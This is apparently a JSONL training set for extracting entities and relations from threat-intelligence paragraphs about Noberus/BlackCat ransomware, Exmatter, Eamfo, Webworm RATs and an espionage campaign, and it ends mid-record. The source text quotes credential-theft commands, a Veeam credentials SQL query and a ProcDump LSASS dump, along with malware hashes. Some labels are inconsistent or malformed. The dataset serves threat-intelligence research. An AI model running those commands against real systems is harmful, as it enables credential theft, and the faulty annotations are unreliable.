{"instruction": "New version of Exmatter, and Eamfo malware, used by attackers deploying the Rust-based ransomware. \nAttackers deploying the Noberus (aka BlackCat, ALPHV) ransomware have been using new tactics, tools, and procedures (TTPs) in recent months, making the threat more dangerous than ever. \nAmong some of the more notable developments has been the use of a new version of the Exmatter data exfiltration tool, and the use of Eamfo, information-stealing malware that is designed to steal credentials stored by Veeam backup software.", "input": null, "output": "Named Entities: (Exmatter, tool), (Eamfo, malware), (Rust-based ransomware, threat type), (Noberus, malware), (BlackCat, malware), (ALPHV, malware)\nRelationships: (Noberus, aka, BlackCat), (Noberus, aka, ALPHV), (Noberus, use, Exmatter), (Noberus, use, Eamfo)"}
{"instruction": "How does Noberus operate? Noberus is widely believed to be a successor payload to the Darkside and BlackMatter ransomware families, which were developed by a group Symantec, by Broadcom Software , tracks as Coreid (aka FIN7, Carbon Spider). Darkside was used in the Colonial Pipeline ransomware attack in May 2021 . The extreme amount of public and law enforcement attention that attack attracted led Coreid to shut down Darkside and replace it with BlackMatter. Coreid runs a ransomware-as-a-service (RaaS) operation, which means it develops the ransomware but it is deployed by affiliates for a cut of the profits. The ransomware being deployed by different affiliates can sometimes explain the different TTPs and attack chains used in Noberus attacks.", "input": null, "output": "Named Entities: (Noberus, malware), (Darkside,malware), (BlackMatter, malware), (Coreid, attacker), (FIN7, attacker), (Carbon Spider, attacker), (RaaS operation, tool)\nRelationships: (Noberus, successor of, Darkside), (Noberus, successor of, BlackMatter), (Noberus, developed by, Coreid), (Coreid, aka, FIN7), (Coreid, aka, Carbon Spider), (Coreid, shut down, Darkside), (Darkside, replace with, BlackMatter), (Coreid, runs, RaaS operation), (RaaS operation, developed by, Coreid)"}
{"instruction": "Noberus sparked interest when it was first seen in November 2021 because it was coded in Rust, and this was the first time we had seen a professional ransomware strain used in real-world attacks coded in that programming language. Rust is a notable language as it is cross-platform. Coreid claims that Noberus is capable of encrypting files on Windows, EXSI, Debian, ReadyNAS, and Synology operating systems. Noberus emerged shortly after BlackMatter announced it was being retired. Coreid sets out in the rules of its affiliate program that Noberus cannot be used to attack: The Commonwealth of Independent States or neighboring countries Organizations in or related to the healthcare sector Charitable or non-profit organizations Affiliates are also advised to avoid attacking the education and government sectors.", "input": null, "output": "Named Entities: (Noberus, malware), (Rust, tool),  (BlackMatter, malware)\nRelationships: (Noberus, coded in, Rust)"}
{"instruction": "When announcing Noberus, Coreid underlined the features that appeared designed to emphasize its superiority to rival ransomware, including that each advert is provided with an entrance through its own unique onion domain; the affiliate program architecturally excludes all possible connections with forums; even if a full-fledged command line shell is obtained, the attacker will not be able to reveal the real IP address of the server, and encrypted negotiation chats that can only be accessed by the intended victim.", "input": null, "output": "Named Entities: (Noberus, malware), (Coreid, attacker), (onion domain, tool)\nRelationships: (Noberus, advertised through, onion domain), (Coreid, announce, Noberus)"}
{"instruction": "The ransomware also offered two encryption algorithms (ChaCha20 and AES), as well as four encryption modes - Full, Fast, DotPattern and SmartPattern. Full is the most secure but also the slowest mode. SmartPattern offers encryption of \u201cN\u201d megabytes in percentage increments. By default, it encrypts with a strip of 10 megabytes every 10 percent of the file starting from the header, which would be an optimal mode for attackers in terms of speed and cryptographic strength. Sentinel Labs recently published a report where it referred to this kind of encryption as \u201cintermittent encryption\u201d and mentioned how it had been adopted by certain ransomware operators , including Noberus, Black Basta, and more.", "input": null, "output": "Named Entities: (ransomware, threat type), (intermittent encryption, tool), (Noberus, attacker), (Black Basta, attacker)\nRelationships: (Noberus, use, intermittent encryption), (intermittent encryption)"}
{"instruction": "The percentage of each ransom that is paid to Noberus affiliates varies depending on the ransom amount. Coreid has continuously updated Noberus since its launch in November 2021 to make its operation more efficient. They will also cull affiliates if they are not bringing in enough money, encouraging them to \u201ccontact less professional teams\u201d. In December 2021, the ransomware added a new \u201cPlus\u201d role for affiliates that had brought in more than $1.5 million. It gave access to: DDoS - used to target domains with DDoS attacks Calls - adding a field to indicate the phone numbers of the victim or add a contact number for the affiliate to communicate directly with victims if they wish Brute - making it possible to brute force NTDS, Kerberos tickets and other hashes for free Coreid made a major update to Noberus in June 2022, which included:", "input": null, "output": "Named Entities: (Noberus, malware), (Coreid, attacker), (DDoS, threat type),  (Brute, threat type)\nRelationships: (Coreid, update, Noberus), (Plus role, access, DDoS), (Plus role, access, Brute)"}
{"instruction": "Introducing an ARM build for encryption of non-standard architectures Introducing SAFEMODE - Added encryption functionality to the Windows build via rebooting into safe mode (--safeboot) and safe mode with networking (--safeboot-network) Coreid also made some updates to the locker, by adding new restart logic, and simplifying the Linux encryption process. In a July 2022 update the team added indexing of stolen data - meaning its data leaks websites can be searched by keyword, file type, and more. The continuous updating and refining of Noberus\u2019 operations shows that Coreid is constantly adapting its ransomware operation to ensure it remains as effective as possible. The FBI issued a warning in April 2022 saying that between November 2021 and March 2022 at least 60 organizations worldwide had been compromised with the Noberus ransomware - the number of victims now is likely to be many multiples of that.", "input": null, "output": "Named Entities: (Noberus, malware), (Coreid, attacker)\nRelationships: (Coreid, update, Noberus)"}
{"instruction": "Noberus and Exmatter: New version of data exfiltration tool used in ransomware attacks In August 2022, a heavily updated version of the Exmatter (Trojan.Exmatter) data exfiltration tool was observed being used alongside Noberus in ransomware attacks. Exmatter was discovered by Symantec researchers in November 2021 being used alongside the Blackmatter ransomware . It was designed to steal specific file types from a number of selected directories and upload them to an attacker-controlled server prior to deployment of the ransomware itself on the victim\u2019s network. Even at the time of its discovery, various variants of the tool were seen, as its developers continued to refine it to optimize its operation and expedite exfiltration of a sufficient volume of high-value data in as short a time as possible.", "input": null, "output": "Named Entities: (Noberus, malware), (Exmatter, malware), (Trojan.Exmatter, malware), (Blackmatter, ransomware)\nRelationships: (Noberus, used alongside, Exmatter), (Exmatter, aka, Trojan.Exmatter), (Exmatter, used alongside, Blackmatter)"}
{"instruction": "This latest version of Exmatter has reduced the number of file types it attempts to exfiltrate. It will now exfiltrate files with the following extensions only: .pdf, .doc, .docx, .xls, .xlsx, .png, .jpg, .jpeg, .txt, .bmp, .rdp, .txt, .sql, .msg, .pst, .zip, .rtf, .ipt, .dwg Other new features include: Addition of third exfiltration capability (FTP) to SFTP and WebDav, which were present in older versions. Reports: Ability to build a report listing all processed files. Eraser: Can corrupt processed files (not turned on in version analyzed). Self-destruct: Configuration option, which, when enabled, will make the tool self-destruct and quit if executed in a non-corporate environment (outside of a Windows domain). Socks5: Socks5 support was removed. In at least one attack, the tool was deployed via GPO.", "input": null, "output": "Named Entities: (Exmatter, malware)\nRelationships:  No related entities and relations."}
{"instruction": "In addition to this, the malware was extensively rewritten, and even existing features were implemented differently. This was possibly a bid to avoid detection. Whether Exmatter is the creation of Coreid or a skilled affiliate of the group is not clear, but its use alongside two different iterations of Coreid\u2019s ransomware is notable. Its continuous development also underlines the focus of the group on data theft and extortion, and the importance of this element of attacks to ransomware actors now.", "input": null, "output": "Named Entities: (Exmatter, malware), (Coreid, attacker), (ransomware, threat type)\nRelationships: (Exmatter, creation of, Coreid), (Exmatter, use alongside, Coreid's ransomware)"}
{"instruction": "Noberus and Eamfo: Attackers using malware to steal credentials from Veeam At least one affiliate of the Noberus ransomware operation was spotted in late August using information-stealing malware that is designed to steal credentials stored by Veeam backup software. Veeam is capable of storing credentials for a wide range of systems, including domain controllers and cloud services. The credentials are stored to facilitate the backup of these systems. The malware (Infostealer.Eamfo) is designed to connect to the SQL database where Veeam stores credentials, and it steal credentials with the following SQL query: select [user_name],[password],[description] FROM [VeeamBackup].[dbo].[Credentials] Eamfo will then decrypt and display the credentials.", "input": null, "output": "Named Entities: (Noberus, malware), (Eamfo, malware), (Infostealer.Eamfo, malware)\nRelationships: No related entities and relations."}
{"instruction": "Eamfo appears to have been in existence since at least August 2021 and there is evidence that it has previously been used by attackers using the Yanluowang and LockBit ransomware families. A recent report from BlackBerry also detailed Eamfo being used alongside a new ransomware strain it dubbed Monti , which appears to be based on the leaked source code of the Conti ransomware. The TTPs used in Monti attacks also closely resemble former Conti attack chains, suggesting those behind Monti may be former affiliates of that group. Conti was developed by a group Symantec tracks as Miner. Stealing credentials from Veeam is a known attack technique that can facilitate privilege escalation and lateral movement, providing the attackers with access to more data they can potentially exfiltrate and more machines to encrypt.", "input": null, "output": "Named Entities: (Eamfo, malware), (Yanluowang, malware), (LockBit, malware), (ransomware, threat type), (Monti, malware), (Conti ransomware, malware), (Miner, attacker)\nRelationships: (Eamfo, used by, Yanluowang), (Eamfo, used by, LockBit),(Yanluowang, belong to, ransomware), (LockBit, belong to, ransomware), (Eamfo, used by, Monti), (Monti, based on, Conti ransomware), (Monti, resemble, Conti ransomware), (Conti ransomware, developed by, Miner)"}
{"instruction": "Noberus attacks involving Eamfo seen by Symantec also utilized GMER, a relatively old rootkit scanner that can be leveraged by ransomware actors to kill processes. GMER usage by ransomware attackers appears to have become more frequent in recent months, and it was also seen in the Monti attack detailed by BlackBerry.", "input": null, "output": "Named Entities: (Noberus, attacker), (Eamfo, malware), (GMER, tool), (ransomware, threat type), (Monti, malware)\nRelationships: (Noberus, involving, Eamfo), (Noberus, utilize, GMER), (GMER, leverage by, ransomware), (GMER, seen in, Monti)"}
{"instruction": "Conclusion \nThere\u2019s no doubt that Coreid is one of the most dangerous and active ransomware developers operating at the moment. The group has been around since 2012, and became well-known for using its Carbanak malware to steal money from organizations worldwide, with the banking, hospitality and retail sectors among its preferred targets. Three members of the group were arrested in 2018, and in 2020 the group changed its tactics and launched its ransomware-as-a-service operation. Its continuous development of its ransomware and its affiliate programs indicates that this sophisticated and well-resourced attacker has little intention of going anywhere anytime soon.", "input": null, "output": "Named Entities: (Coreid, attacker), (Carbanak, malware), (ransomware, threat type)\nRelationships: (Coreid, use, Carbanak), (Coreid, change tactics, ransomware-as-a-service operation)"}
{"instruction": "Webworm: Espionage Attackers Testing and Using Older Modified RATs", "input": null, "output": "Named Entities: (Webworm, attacker)"}
{"instruction": "The attackers are working on a number of malware threats, some of which have been used in attacks while others are in pre-deployment or testing stages. \nSymantec, by Broadcom Software , has gained insight into the current activities of a group we call Webworm. The group has developed customized versions of three older remote access Trojans (RATs), including Trochilus, Gh0st RAT, and 9002 RAT. At least one of the indicators of compromise (IOCs) observed by Symantec was used in an attack against an IT service provider operating in multiple Asian countries, while others appear to be in pre-deployment or testing stages.", "input": null, "output": "Named Entities: (Webworm, attacker), (Trochilus, malware), (Gh0st RAT, malware), (9002 RAT, malware)\nRelationships: (Webworm, develop, Trochilus), (Webworm, develop, Gh0st RAT), (Webworm, develop, 9002 RAT)"}
{"instruction": "Webworm Symantec\u2019s Webworm has links to a group dubbed Space Pirates, which was previously documented in a May 2022 report from Positive Technologies . It is likely that the two groups are one and the same. Active since at least 2017, Webworm has been known to target government agencies and enterprises involved in IT services, aerospace, and electric power industries located in Russia, Georgia, Mongolia, and a number of other Asian countries. Previous research on the group\u2019s activity found that it uses custom loaders hidden behind decoy documents and modified backdoors that have been around for quite some time. This corresponds with recent Webworm activity observed by Symantec. Malware used by Webworm includes versions of the following threats: Trochilus RAT", "input": null, "output": "Named Entities: (Webworm, attacker), (Space Pirates, attacker), (Trochilus RAT, malware)\nRelationships: (Webworm, link to, Space Pirates), (Webworm, use, Trochilus RAT)"}
{"instruction": "First spotted back in 2015, Trochilus is a RAT implemented in C++ and its source code is available for download on GitHub. The malware has been used in targeted threat operations by multiple groups and has features that can help it evade sandbox analysis and be useful in cyber-espionage operations. The RAT\u2019s features include, but are not limited to, the ability to remotely uninstall a file manager, and the ability to download, upload, and execute files. Trochilus has been previously linked to malware operations from threat actors also using malware such as PlugX and a variant of the 9002 RAT. 9002 RAT", "input": null, "output": "Named Entities: (Trochilus, malware), (C++, tool), (GitHub, tool), (cyber-espionage operations, threat type), (PlugX, malware), (9002 RAT, malware)\nRelationships: (Trochilus, implemented in, C++), (Trochilus, available for download on, GitHub), (Trochilus, useful in, cyber-espionage operations), (Trochilus, linked to, PlugX), (Trochilus, linked to, 9002 RAT)"}
{"instruction": "The 9002 RAT appears to have been in use since at least 2009 and has historically been used by state-sponsored actors. The malware provides attackers with extensive data exfiltration capabilities. Some variants of 9002 RAT inject into memory and do not write to the disk, something that also applies to the sample analyzed by Symantec. The malware has been used in multiple campaigns by a range of actors, including in a hacking operation targeting several large corporations located in South Korea. The RAT was used to deliver additional malware, including the PlugX RAT, onto compromised machines. It has also been involved in attacks making use of zero-day exploits . Gh0st RAT While the source code for Gh0st RAT was released online in 2008, the malware has continued to be used by advanced persistent threat (APT) groups.", "input": null, "output": "Named Entities: (9002 RAT, malware), (state-sponsored actors, attacker), (PlugX RAT, malware), (Gh0st RAT, malware), (advanced persistent threat (APT) groups, attacker)\nRelationships: (9002 RAT, used by, state-sponsored actors), (9002 RAT, deliver, PlugX RAT), (Gh0st RAT, use by, advanced persistent threat (APT) groups)"}
{"instruction": "Gh0st RAT first made headlines back in 2009, when a cyber-espionage group called GhostNet used it to target diplomatic, political, economic, and military targets around the world.", "input": null, "output": "Named Entities: (Gh0st RAT, malware), (GhostNet, attacker)\nRelationships: (Gh0st RAT, used by, GhostNet)"}
{"instruction": "Observed Webworm activity Symantec observed three malware droppers developed by Webworm: 6201c604ac7b6093dc8f6f12a92f40161508af1ddffa171946b876442a66927e (Trochilus dropper) b9a0602661013d973bc978d64b7abb6bed20cf0498d0def3acb164f0d303b646 (Trochilus Dropper) c71e0979336615e67006e20b24baafb19d600db94f93e3bf64181478dfc056a8 (Trochilus Dropper) Analysis of one of the droppers revealed that it drops the following files: [TEMP]\\Logger.exe (28d78e52420906794e4059a603fa9f22d5d6e4479d91e9046a97318c83998679) [TEMP]\\sc.cfg (a618b3041935ec3ece269effba5569b610da212b1aa3968e5645f3e37d478536) [TEMP]\\logexts.dat (a6b9975bfe02432e80c7963147c4011a4f7cdb9baaee4ae8d27aaff7dff79c2b) [TEMP]\\logexts.dll (a73a4c0aa557241a09e137387537e04ce582c989caa10a6644d4391f00a836ef) [TEMP]\\logger.dat (10456bc3b5cfd2f1b1ab9c3833022ef52f5e9733d002ab237bdebad09b125024) [TEMP]\\[RANDOM_DIGITS].doc (d295712185de2e5f8811b0ce7384a04915abdf970ef0f087c294bb00e340afad) The legitimate executable Logger.exe is used to call the \u201cLoadLibraryA\u201d API in order to load the malicious \"[TEMP]\\logexts.dll\" file. The logexts.dll file is a loader. Once run, it checks the process command-line parameters. If the command-line is the single parameter \"isdf\", it attempts to steal a token from the \"WINLOGON.EXE\" process. It then starts the following process by calling the CreateProcessAsUserW API: C:\\ProgramData\\Logger\\Logger.exe mdkv Otherwise it constructs the pathname of the second stage based on its own running executable, where it replaces the last three characters with hardcoded \"dat\" (resulting with \"Logger.dat\"). Then it reads and executes the second stage as shellcode.", "input": null, "output": "Named Entities: (Webworm, attacker), (Trochilus dropper, malware), (6201c604ac7b6093dc8f6f12a92f40161508af1ddffa171946b876442a66927e, SHA256), (Trochilus Dropper, malware), (b9a0602661013d973bc978d64b7abb6bed20cf0498d0def3acb164f0d303b646, SHA256), (Trochilus Dropper, malware), (c71e0979336615e67006e20b24baafb19d600db94f93e3bf64181478dfc056a8, SHA256), ([TEMP]\\Logger.exe, file), (28d78e52420906794e4059a603fa9f22d5d6e4479d91e9046a97318c83998679, SHA256), ([TEMP]\\sc.cfg, file), (a618b3041935ec3ece269effba5569b610da212b1aa3968e5645f3e37d478536, SHA256), ([TEMP]\\logexts.dat, file), (a6b9975bfe02432e80c7963147c4011a4f7cdb9baaee4ae8d27aaff7dff79c2b, SHA256), ([TEMP]\\logexts.dll, file), (a73a4c0aa557241a09e137387537e04ce582c989caa10a6644d4391f00a836ef, SHA256), ([TEMP]\\logger.dat, file), (10456bc3b5cfd2f1b1ab9c3833022ef52f5e9733d002ab237bdebad09b125024, SHA256), ([TEMP]\\[RANDOM_DIGITS].doc, file), (d295712185de2e5f8811b0ce7384a04915abdf970ef0f087c294bb00e340afad, SHA256), ([TEMP]\\logexts.dll, file), (logexts.dll, file), (Logger.dat, file)\nRelationships: (Webworm, develop, Trochilus dropper), (Trochilus dropper, hash, 6201c604ac7b6093dc8f6f12a92f40161508af1ddffa171946b876442a66927e), (Trochilus Dropper, hash, b9a0602661013d973bc978d64b7abb6bed20cf0498d0def3acb164f0d303b646), (Trochilus Dropper, hash, c71e0979336615e67006e20b24baafb19d600db94f93e3bf64181478dfc056a8), (Trochilus dropper, drop, [TEMP]\\Logger.exe), ([TEMP]\\Logger.exe, hash, 28d78e52420906794e4059a603fa9f22d5d6e4479d91e9046a97318c83998679), (Trochilus dropper, drop, [TEMP]\\sc.cfg), ([TEMP]\\sc.cfg, hash, a618b3041935ec3ece269effba5569b610da212b1aa3968e5645f3e37d478536), (Trochilus dropper, drop, [TEMP]\\logexts.dat), ([TEMP]\\logexts.dat, hash, a6b9975bfe02432e80c7963147c4011a4f7cdb9baaee4ae8d27aaff7dff79c2b), (Trochilus dropper, drop, [TEMP]\\logexts.dll), ([TEMP]\\logexts.dll, hash, a73a4c0aa557241a09e137387537e04ce582c989caa10a6644d4391f00a836ef), (Trochilus dropper, drop, [TEMP]\\logger.dat), ([TEMP]\\logger.dat, hash, 10456bc3b5cfd2f1b1ab9c3833022ef52f5e9733d002ab237bdebad09b125024), (Trochilus dropper, drop, [TEMP]\\[RANDOM_DIGITS].doc), ([TEMP]\\[RANDOM_DIGITS].doc, hash, d295712185de2e5f8811b0ce7384a04915abdf970ef0f087c294bb00e340afad),  (LoadLibraryA, load, [TEMP]\\logexts.dll), ([TEMP]\\logexts.dll, loader, logexts.dll), (logexts.dll, check, WINLOGON.EXE), (logexts.dll, start, C:\\ProgramData\\Logger\\Logger.exe), (logexts.dll, construct, Logger.dat)"}
{"instruction": "The second stage (\"Logger.dat\") constructs the pathname of the third stage also based on its own running executable, where it combines the directory part with hardcoded \"logexts.dat\". Finally, it reads and executes the third stage. The logexts.dat file is obfuscated and includes several User Account Control (UAC) bypasses. It attempts to copy the previously dropped files to the following new locations: [Temp]\\Logger.exe to C:\\ProgramData\\Logger\\Logger.exe [Temp]\\Logger.dat to C:\\ProgramData\\Logger\\logger.dat [Temp]\\logexts.dll to C:\\ProgramData\\Logger\\logexts.dll [Temp]\\logexts.dat to C:\\ProgramData\\Logger\\logexts.dat [Temp]\\sc.cfg to C:\\ProgramData\\Logger\\sc.cfg Then the file unpacks and executes in memory its backdoor payload, a variant of the Trochilus RAT (e69177e58b65dd21e0bbe4f6caf66604f120e0c835f3ee0d16a45858f5fe9d90). The Trochilus modifications include functionality to load its configuration from a file by checking for any of the following locations (in order of preference): C:\\ProgramData\\Logger\\sc.cfg C:\\ProgramData\\resmon.resmoncfg C:\\ProgramData\\appsoft\\resmon.resmoncfg The content of the configuration file is decompressed using the Lempel\u2013Ziv\u2013Welch (LZW) algorithm.", "input": null, "output": "Named Entities: (Logger.dat, file), (logexts.dat, file), (Trochilus RAT, malware), (e69177e58b65dd21e0bbe4f6caf66604f120e0c835f3ee0d16a45858f5fe9d90, SHA256), (C:\\ProgramData\\Logger\\Logger.exe, file), (C:\\ProgramData\\Logger\\logger.dat, file), (C:\\ProgramData\\Logger\\logexts.dll, file), (C:\\ProgramData\\Logger\\logexts.dat, file), (C:\\ProgramData\\Logger\\sc.cfg, file), (C:\\ProgramData\\resmon.resmoncfg, file), (C:\\ProgramData\\appsoft\\resmon.resmoncfg, file)\nRelationships: (Logger.dat, read and execute, logexts.dat), ( logexts.dat, copy, C:\\ProgramData\\Logger\\Logger.exe),  logexts.dat, copy, C:\\ProgramData\\Logger\\logger.dat), (logexts.dat, copy, C:\\ProgramData\\Logger\\logexts.dll), (logexts.dat, copy, C:\\ProgramData\\Logger\\logexts.dat), ( logexts.dat, copy, C:\\ProgramData\\Logger\\sc.cfg), (Trochilus RAT, hash, e69177e58b65dd21e0bbe4f6caf66604f120e0c835f3ee0d16a45858f5fe9d90), (Trochilus RAT, load configuration from, C:\\ProgramData\\Logger\\sc.cfg), (Trochilus RAT, load configuration from, C:\\ProgramData\\resmon.resmoncfg), (Trochilus RAT, load configuration from, C:\\ProgramData\\appsoft\\resmon.resmoncfg)"}
{"instruction": "Interestingly, one of the locations described above (\u201cC:\\ProgramData\\resmon.resmoncfg\u201d) is mentioned in third-party research detailing previous Space Pirates (Webworm) activity. The malware then injects svchost.exe with the ability to: Execute commands Download potentially malicious files Further investigation by Symantec found that droppers that share a similar structure to the one used to deploy the version of Trochilus RAT modified by Webworm were also used to deploy two additional modified versions of Gh0st RAT and 9002 RAT. Some code modifications made to the variant of Trochilus RAT were also present in the two additional retooled RATs. The additional RATs included: Gh0st RAT: 1e725f1fe67d1a596c9677df69ef5b1b2c29903e84d7b08284f0a767aedcc097 (Dropper) b0a58c6c859833eb6fb1c7d8cb0c5875ab42be727996bcc20b17dd8ad0058ffa (Shellcode loader) 1CC32C7F2C90A558BA5FF6BA191E655B20D7C65C10AF0D5D06820A28C2947EFD (Shellcode loader) 9002 RAT: 6e46054aa9fd5992a7398e0feee894d5887e70373ca5987fc56cd4c0d28f26a1 (Dropper) 37fa5108db1ae73475911a5558fba423ef6eee2cf3132e35d3918b9073aeecc1 (Packed backdoor)", "input": null, "output": "Named Entities: (Space Pirates, attacker), (Webworm, malware), (resmon.resmoncfg, file), (svchost.exe, file), (Trochilus RAT, malware), (Gh0st RAT, malware), (9002 RAT, malware), (1e725f1fe67d1a596c9677df69ef5b1b2c29903e84d7b08284f0a767aedcc097, SHA256), (b0a58c6c859833eb6fb1c7d8cb0c5875ab42be727996bcc20b17dd8ad0058ffa, SHA256), (1CC32C7F2C90A558BA5FF6BA191E655B20D7C65C10AF0D5D06820A28C2947EFD, SHA256), (6e46054aa9fd5992a7398e0feee894d5887e70373ca5987fc56cd4c0d28f26a1, SHA256), (37fa5108db1ae73475911a5558fba423ef6eee2cf3132e35d3918b9073aeecc1, SHA256)\n\nRelationships: (Space Pirates, mention, resmon.resmoncfg), (Webworm, inject, svchost.exe), (Space Pirates, deploy, Trochilus RAT), (Space Pirates, deploy, Gh0st RAT), (Space Pirates, deploy, 9002 RAT), (Trochilus RAT, modified by, Webworm), (Gh0st RAT, dropper, 1e725f1fe67d1a596c9677df69ef5b1b2c29903e84d7b08284f0a767aedcc097), (Gh0st RAT, shellcode loader, b0a58c6c859833eb6fb1c7d8cb0c5875ab42be727996bcc20b17dd8ad0058ffa), (Gh0st RAT, shellcode loader, 1CC32C7F2C90A558BA5FF6BA191E655B20D7C65C10AF0D5D06820A28C2947EFD), (9002 RAT, dropper, 6e46054aa9fd5992a7398e0feee894d5887e70373ca5987fc56cd4c0d28f26a1), (9002 RAT, packed backdoor, 37fa5108db1ae73475911a5558fba423ef6eee2cf3132e35d3918b9073aeecc1)"}
{"instruction": "Changes made by Webworm to this version of 9002 RAT are apparently intended to evade detection. For example, the details of the RAT\u2019s communication protocol, such as encryption, have also been modified by the threat actors. Gh0st RAT (BH_A006) was documented in third-party research detailing previous Webworm (Space Pirates) activity. In that research, the version of Gh0st RAT included features such as layers of obfuscation to bypass security protections and hinder analysis, network service creation, UAC bypassing, and shellcode unpacking and launching in the memory. Some of these features were also present in the version of the RAT being prepared by Webworm.", "input": null, "output": "Named Entities: (Webworm, attacker), (9002 RAT, malware), (Gh0st RAT, malware)\nRelationships: (Webworm, modify, 9002 RAT), (Webworm, prepare, Gh0st RAT)"}
{"instruction": "Conclusion \nWebworm\u2019s use of customized versions of older, and in some cases open-source, malware, as well as code overlaps with the group known as Space Pirates, suggest that they may be the same threat group. However, the common use of these types of tools and the exchange of tools between groups in this region can obscure the traces of distinct threat groups, which is likely one of the reasons why this approach is adopted, another being cost, as developing sophisticated malware can be expensive in terms of both money and time.", "input": null, "output": "Named Entities: (Webworm, attacker), (Space Pirates, attacker)\nRelationships: (Webworm, same threat group as, Space Pirates)"}
{"instruction": "New Wave of Espionage Activity Targets Asian Governments", "input": null, "output": "No related entities and relations."}
{"instruction": "Governments and state-owned organizations are the latest targets of a well-established threat actor. \nA distinct group of espionage attackers who were formerly associated with the ShadowPad remote access Trojan (RAT) has adopted a new, diverse toolset to mount an ongoing campaign against a range of government and state-owned organizations in a number of Asian countries. The attacks, which have been underway since at least early 2021, appear to have intelligence gathering as their main goal.", "input": null, "output": "Named Entities: (ShadowPad, malware), (remote access Trojan (RAT), threat type)\nRelationships: (ShadowPad, belong to, remote access Trojan (RAT))"}
{"instruction": "Targets \nThe current campaign appears to be almost exclusively focused on government or public entities, including: \nHead of government/Prime Minister\u2019s Office \nGovernment institutions linked to finance \nGovernment-owned aerospace and defense companies \nState-owned telecoms companies \nState-owned IT organizations \nState-owned media companies", "input": null, "output": "No related entities and relations."}
{"instruction": "Tools A notable feature of these attacks is that the attackers leverage a wide range of legitimate software packages in order to load their malware payloads using a technique known as DLL side-loading. Usually, the attackers used multiple software packages in a single attack. In many cases, old and outdated versions of software are used, including security software, graphics software, and web browsers. In some cases, legitimate system files from the legacy operating system Windows XP are used. The reason for using outdated versions is that most current versions of the software used would have mitigation against side-loading built-in. DLL side-loading is a well-known technique that involves attackers placing a malicious DLL in a directory where a legitimate DLL is expected to be found. The attacker then runs the legitimate application themselves (having installed it themselves in most cases). The legitimate application then loads and executes the payload.", "input": null, "output": "No related entities and relations."}
{"instruction": "Once a malicious DLL is loaded by the attackers, malicious code is executed, which in turn loads a .dat file. This file contains arbitrary shellcode that is used to execute a variety of payloads and associated commands in memory. In some cases, the arbitrary shellcode is encrypted. The attackers also leverage these legitimate software packages to deploy additional tools, which are used to further aid in lateral movement. These tools include credential dumping tools, a number of network scanning tools (NBTScan, TCPing, FastReverseProxy, and FScan), and the Ladon penetration testing framework. Attacks usually unfold in the following manner: Once backdoor access is gained, the attackers use Mimikatz and ProcDump to steal credentials. In some cases, the attackers dump credentials via the registry. They then use network scanning tools to identify other computers of interest, such as those running RDP, which could facilitate lateral movement.", "input": null, "output": "Named Entities: (NBTScan, tool), (TCPing, tool), (FastReverseProxy, tool), (FScan, tool), (Mimikatz, tool), (ProcDump, tool)\n\nRelationships: No related entities and relations."}
{"instruction": "They leverage PsExec to run old versions of legitimate software, which are then used to load additional malware tools such as off-the-shelf RATS via DLL side-loading on other computers on the networks. The attackers also use a number of living-off-the-land tools such as Ntdsutil to mount snapshots of Active Directory servers in order to gain access to Active Directory databases and log files. The Dnscmd command line tool is also used to enumerate network zone information.", "input": null, "output": "Named Entities: (PsExec, tool), (RATS, malware), (Ntdsutil, tool)\nRelationships: (attackers, use, PsExec), (PsExec,  load, RATS), (attacker, use, Ntdsutil)"}
{"instruction": "Case Study: An unfolding attack In April 2022, the attackers targeted a government-owned organization in the education sector in Asia and managed to stay on its network until July. During the period of the compromise, the attackers accessed computers hosting databases and emails and eventually made their way to the domain controller. The first sign of malicious activity occurred on April 23, when a malicious command was executed via imjpuex.exe (SHA256: fb5bc4baece5c3ab3dabf84f8597bed3c3f2997336c85c84fdf4beba2dcb700f). The file imjputyc.exe is a legitimate Windows XP file that was used by the attackers to side-load a malicious DLL file (imjputyc.dll), which in turn was used to load a .dat file (payload - imjputyc.dat). Following this activity, imjputyc.exe was used to launch a network service via svchost.exe, likely created by the malicious payload. CSIDL_SYSTEMX86\\svchost.exe NetworkService 7932", "input": null, "output": "Named Entities: (attackers, attacker), (imjpuex.exe, file), (fb5bc4baece5c3ab3dabf84f8597bed3c3f2997336c85c84fdf4beba2dcb700f, SHA256), (imjputyc.exe, file), (imjputyc.dll, file), (imjputyc.dat, file), (svchost.exe, file)\n\nRelationships: (imjpuex.exe, used by, attackers), (imjpuex.exe, SHA256, fb5bc4baece5c3ab3dabf84f8597bed3c3f2997336c85c84fdf4beba2dcb700f), (imjputyc.exe, used by, attackers), (imjputyc.exe, side-load, imjputyc.dll), (imjputyc.dll, load, imjputyc.dat), (imjputyc.exe, launch, svchost.exe)"}
{"instruction": "Additionally, around the same time, the attackers leveraged Imjpuex.exe to install and execute an eleven-year-old version of Bitdefender Crash Handler (file name: javac.exe, SHA256: 386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd). While Crash Handler was used for side-loading in this attack, it is just one of many old versions of applications that have been used by this group in recent months. The same Crash Handler executable was copied to CSIDL_SYSTEM_DRIVE\\xampp\\tmp\\vmware.exe and executed. The attackers then installed and executed ProcDump in order to dump credentials from the Local Security Authority Server Service (LSASS): p.exe -accepteula -ma lsass.exe lsass2.dmp The attackers then launched several command prompts while reloading Crash Handler. This was likely done in order to install additional tools. Shortly afterwards, a file called calc.exe (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9) appeared on the machine and was executed by the attackers. This was a renamed version of Mimikatz that the attackers then used to dump credentials:", "input": null, "output": "Named Entities: (Imjpuex.exe, tool), (Bitdefender Crash Handler, tool), (javac.exe, file), (386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd, SHA256), (CSIDL_SYSTEM_DRIVE\\xampp\\tmp\\vmware.exe, file), (ProcDump, tool),  (p.exe, file), (lsass.exe, file), (lsass2.dmp, file), (calc.exe, file), (912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9, SHA256), (Mimikatz, tool)\n\nRelationships: (attackers, leveraged, Imjpuex.exe) (Imjpuex.exe, install, Bitdefender Crash Handler), (Bitdefender Crash Handler, file name, javac.exe), (javac.exe, hash, 386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd), (Bitdefender Crash Handler, copy to, CSIDL_SYSTEM_DRIVE\\xampp\\tmp\\vmware.exe), (attackers, install, ProcDump), (ProcDump, execute, p.exe), (p.exe, accepteula, lsass.exe), (p.exe, dump to, lsass2.dmp), (attackers, execute, calc.exe), (calc.exe, hash, 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9), (calc.exe, 